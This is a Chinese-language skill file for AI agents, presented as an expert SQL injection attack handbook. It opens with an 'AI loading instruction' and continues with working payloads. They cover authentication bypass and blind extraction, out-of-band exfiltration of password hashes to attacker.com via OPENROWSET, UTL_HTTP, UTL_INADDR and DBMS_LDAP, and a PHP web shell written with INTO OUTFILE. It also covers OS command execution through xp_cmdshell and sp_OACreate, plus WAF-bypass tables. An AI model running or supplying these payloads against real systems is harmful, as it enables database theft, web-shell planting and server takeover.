# 技能：SQL注入——专家攻击手册

> **AI加载指令**：高级SQL注入技术。假设已知UNION/错误/布尔盲基础。重点关注：单库利用、带外数据提取、二次注入、参数化查询绕过场景、过滤绕过，以及提升至操作系统权限。针对真实世界的CVE案例，加载配套[SCENARIOS.md](./SCENARIOS.md)以支持SMB/DNS带外数据提取、INSERT/UPDATE注入模式，以及特定框架（ThinkPHP、Django GIS）的利用。

## 0. 相关路由

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md)：当后端为**Java with Jackson**且SQL关键字被WAF拦截时——Jackson的`charToHex`表按`ch & 0xFF`索引，因此Unicode字符如`丰`（U+4E30）在`\uXXXX`转义序列中解析为十六进制数字`0`，允许在不触发WAF的情况下注入`UNION`、`SELECT`、`1`等。

## 1. 快速入门

### 扩展场景

当需要以下功能时，加载[SCENARIOS.md](./SCENARIOS.md)：
- 通过`LOAD_FILE` + UNC路径进行SMB带外数据提取（Windows MySQL）
- KEY注入/URI注入/非参数化注入点
- INSERT/DELETE/UPDATE语句注入差异
- ThinkPHP5数组键注入（`updatexml`基于错误）
- Django GIS Oracle `utl_inaddr.get_host_name` CVE
- ORDER BY / LIMIT注入技术

### 高级参考

当需要以下功能时，加载[SQLMAP_ADVANCED.md](./SQLMAP_ADVANCED.md)：
- SQLMap篡改脚本矩阵和WAF绕过篡改链配方（space2comment、between、charencode等）
- `--technique`、`--risk`/`--level`组合及`--second-url`用于二次注入
- `--os-shell` / `--os-pwn`通过SQLMap进行操作系统级利用
- INSERT/UPDATE/DELETE注入模式及数据提取示例
- GraphQL + SQL注入（批量查询、嵌套字段注入、变异注入）
- 数据库特定高级函数：PostgreSQL美元符号引用、MSSQL链接服务器、Oracle DBMS_PIPE/DBMS_SCHEDULER

若仅确认可疑SQL接收端，则无需先加载额外载荷技能；在此处完成初次验证。

### 初次验证载荷家族

| 场景 | 从此开始 | 原因 |
|---|---|---|
| 登录或布尔分支 | `' or 1=1--` | 快速验证认证或条件检查 |
| 数字参数 | `1 or 1=1` | 避免引号依赖 |
| ORDER BY / 排序 | `1,2,3`然后`1 desc--` | 适用于结构探测 |
| 可见SQL错误 | `'`然后数据库管理系统特定错误探测 | 错误文本提供数据库线索 |
| 无可见输出 | 时间载荷 | 盲目标稳定回退 |
| 重度过滤/WAF | 多语言或无空格变体 | 扩展解析器混淆表面 |

### 小型稳定初次验证集

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### 数据库管理系统路由提示

| 提示 | 可能的数据库 | 下一步操作 |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | 尝试`SLEEP()`和`@@version` |
| `Microsoft OLE DB Provider` | MSSQL | 尝试`WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | 尝试`pg_sleep()` |
| `ORA-`前缀 | Oracle | 转向带外或XML特性 |
| SQLite错误，本地应用 | SQLite | 专注于布尔/UNION和文件后缀行为 |

---

## 1. 检测——隐蔽指示

大多数SQL注入通过**行为差异**而非错误发现：

| 信号 | 含义 |
|---|---|
| 使用`'`与`''`页面加载不同 | 字符串上下文注入点 |
| 数字：`1`与`1-1`与`2-1`返回相同 | 计算求值 |
| 条件中`1=1`与`1=2`改变结果 | 布尔注入 |
| 带ORDER BY N的SELECT：列计数枚举 | UNION准备 |
| 时间延迟：`'; WAITFOR DELAY '0:0:5'--` | 盲/时间依赖 |
| `'`产生500错误，`''`产生200 | 未处理异常=SQL注入 |
| 不同HTTP响应大小 | 布尔盲指示 |

**关键**：在所有参数类型中测试——URL查询、POST正文、JSON字段、XML值、HTTP头（X-Forwarded-For、User-Agent、Referer、Cookie值）。

---

## 2. 数据库指纹识别

```sql
-- MySQL
VERSION()              -- 返回版本字符串
@@datadir              -- 数据目录
@@global.secure_file_priv  -- 文件读取限制

-- MSSQL
@@VERSION              -- 包含"Microsoft SQL Server"
DB_NAME()              -- 当前数据库
USER_NAME()            -- 当前用户

-- Oracle
v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name      -- 当前数据库（替代方案）
user                   -- 当前Oracle用户

-- PostgreSQL
version()              -- 返回版本
current_database()     -- 当前数据库
current_user           -- 当前用户
```

**基于错误的指纹**：注入`'`并读取错误消息格式。MySQL错误与Oracle/MSSQL不同。

---

## 3. UNION基础数据提取

**列计数确定**：
```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY N--   ← 直到错误 = N-1列
```

**列类型检测**（NULL最安全）：
```sql
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--  ← 查找字符串列
```

**数据库特定字符串连接**（当列仅接受整数时需要）：
```sql
-- MySQL
CONCAT(username,0x3a,password)

-- MSSQL
username+'|'+password

-- Oracle
username||'|'||password

-- PostgreSQL
username||':'||password
```

---

## 4. 盲注入——推断技术

### 布尔盲（条件响应差异）
```sql
-- 用户名首字符是否为'a'？
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--

-- Oracle
' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--
```

### 时间盲（无响应差异）
```sql
-- MSSQL（最可靠）
'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--

-- MySQL
' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
-- Oracle睡眠替代（无SLEEP）：
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 5. 带外（OOB）数据提取——关键

当盲注入无时间/布尔指示，或批量查询无法内联返回数据时使用。

### MSSQL — OpenRowSet（需要SQLOLEDB，出站TCP）
```sql
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) VALUES (@@version)--

-- 提取表数据：
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) SELECT TOP 1 username+':'+password FROM users--
```
使用**端口80或443**以绕过防火墙出站限制。

### Oracle — UTL_HTTP（URL路径中的数据嵌入HTTP GET）
```sql
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```
Oracle的UTL_HTTP支持代理——可经企业代理传输！

### Oracle — UTL_INADDR（DNS数据提取——常绕过HTTP限制）
```sql
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```
攻击者看到：`HASH_VALUE.attacker.com` DNS查询 → 读取密码哈希。

### Oracle — UTL_SMTP / UTL_TCP
```sql
-- 通过邮件发送大量数据转储：
UTL_SMTP.SENDMAIL(...)  -- 通过邮件发送查询结果

-- 原始TCP套接字：
UTL_TCP.OPEN_CONNECTION('attacker.com', 80)
```

### MySQL — DNS via LOAD_FILE（Windows + UNC路径）
```sql
SELECT LOAD_FILE('\\\\attacker.com\\share')
-- 触发DNS查询，然后连接尝试
-- Windows主机带出站SMB时有效
```

### MySQL — INTO OUTFILE（内联文件系统写入）
```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
-- 要求：FILE权限，可写Web根目录，secure_file_priv=''
```

---

## 6. 提升权限——操作系统命令执行

### MSSQL — xp_cmdshell（若启用，或sysadmin权限）
```sql
'; EXEC xp_cmdshell('whoami')--

-- 若禁用（需sysadmin）：
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

### MySQL — UDF（用户定义函数）
将恶意共享库写入文件系统，然后`CREATE FUNCTION ... SONAME`。

### Oracle — Java Stored Procedures
```sql
-- 创建Java类：
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
-- 然后通过Java Runtime执行OS命令
```

---

## 7. 二次注入

**概念**：用户输入安全存储（参数化），但稍后**作为可信数据检索**并拼接到新查询中，未重新消毒。

**攻击流程示例**：
1. 注册用户名：`admin'--`
2. 应用程序安全插入此内容到用户表
3. 密码修改功能从会话（可信！）中获取用户名并构建：
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. 注释移除条件 → 更新**admin**的密码

**关键洞察**：任何读取存储数据并在新数据库查询中使用的应用程序功能都是二次注入候选。审查：密码修改、个人资料更新、管理员用户数据操作。

---

## 8. 参数化查询绕过场景

参数化查询在以下情况无效：

1. **表/列名受用户控制**——参数无法参数化标识符：
   ```sql
   -- 即使有参数也不安全：
   "SELECT * FROM " + tableName + " WHERE id = ?"
   ```
   缓解：白名单验证表/列名。

2. **部分参数化**——部分字段连接，部分参数化：
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"
   -- userType未参数化 → 注入
   ```

3. **IN子句**带动态计数（ORM常见错误）：
   ```sql
   SELECT * FROM items WHERE id IN (1, 2, ?)  -- 仅最后一个参数化
   ```

4. **二次注入**——从DB检索数据假定干净，无参数重用。

---

## 9. 过滤绕过技术

### 注释注入（破坏关键字）
```sql
SEL/**/ECT
UN/**/ION
1 UN/**/ION ALL SEL/**/ECT NULL--
```

### 案例变化
```sql
UnIoN SeLeCt
```

### URL编码
```sql
%55NION  -- U
%53ELECT -- S
```

### 空格替代
```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- Tab
SELECT%0ausername%0aFROM%0ausers  -- Newline
```

### 字符串构造（绕过字面量检测）
```sql
-- MySQL连接无引号：
CHAR(117,115,101,114,110,97,109,101)  -- 'username'

-- Oracle:
CHR(117)||CHR(115)||CHR(101)||CHR(114)

-- MSSQL:
CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)
```

---

## 10. 数据库元数据提取

### MySQL
```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### MSSQL
```sql
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'  -- 用户表
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
```

### Oracle
```sql
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username,password FROM dba_users  -- 需要DBA权限
```

### PostgreSQL
```sql
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## 11. 存储过程滥用

### MSSQL — sp_OAMethod（COM自动化）
```sql
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'
```

### Oracle — DBMS_LDAP（出站LDAP=DNS数据提取）
```sql
SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',389) FROM dual
```

---

## 12. 快速参考——注入测试字符串

```
'                          -- 破坏字符串上下文
''                         -- 转义引号（测试处理）
' OR 1=1--                 -- 认证绕过尝试  
' OR 'a'='a               -- 替代认证绕过
'; SELECT 1--             -- 语句终止
' UNION SELECT NULL--     -- UNION测试
' AND 1=1--               -- 布尔真
' AND 1=2--               -- 布尔假（不同响应→可注入）
1; WAITFOR DELAY '0:0:3'-- -- MSSQL时间延迟
1 AND SLEEP(3)--          -- MySQL时间延迟
1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle时间延迟
```

---

## 13. WAF绕过矩阵

| 技术 | 拦截 | 绕过 |
|---|---|---|
| 空格过滤 | `SELECT * FROM` | `SELECT/**/*//**/FROM`, `SELECT%0a*%0aFROM` |
| 逗号过滤 | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| 引号过滤 | `'admin'` | `0x61646D696E`（十六进制），`CHAR(97,100,109,105,110)` |
| OR/AND过滤 | `OR 1=1` | <code>&#124;&#124;1=1</code>, `&&1=1`, `DIV 0` |
| =过滤 | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| SELECT过滤 | | 使用`handler`（MySQL），`PREPARE`+十六进制，或堆叠查询 |
| information_schema过滤 | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |

额外WAF绕过模式：

- 多语言：`SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`
- 路由注入：`1' UNION SELECT 0x(inner_payload_hex)-- -`，其中inner payload为另一完整查询十六进制编码
- 二次注入：注入到存储，稍后触发数据在另一查询中使用
- PDO模拟准备：当`PDO::ATTR_EMULATE_PREPARES=true`时，即使代码看起来像参数化，堆叠查询也有效

---

## 14. WAF绕过矩阵

### 无空格绕过
```sql
SELECT/**/username/**/FROM/**/users
SELECT(username)FROM(users)
```

### 无逗号绕过
```sql
-- UNION使用JOIN替代逗号：
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- SUBSTRING替代：SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT替代：LIMIT 1 OFFSET 0
```

### 多语言注入
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### 路由注入
```sql
-- 第一个查询返回字符串作为第二个查询输入：
' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--
-- 返回值成为另一个SQL上下文的一部分
```

### 二次注入
```
-- 第一步：注册用户名：admin'--
-- 第二步：触发密码修改（使用存储的用户名在SQL中）
-- UPDATE users SET password='new' WHERE username='admin'--'
```

### PDO/准备语句边缘案例
```php
// 即使有PDO时结构动态也不安全：
$pdo->query("SELECT * FROM " . $_GET['table']);
// 或使用模拟准备的多查询：
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
```

### 入口点检测（Unicode技巧）
```
U+02BA ʺ (修饰字母双引号) → "
U+02B9 ʹ (修饰字母单引号) → '
%%2727 → %27 → '
```
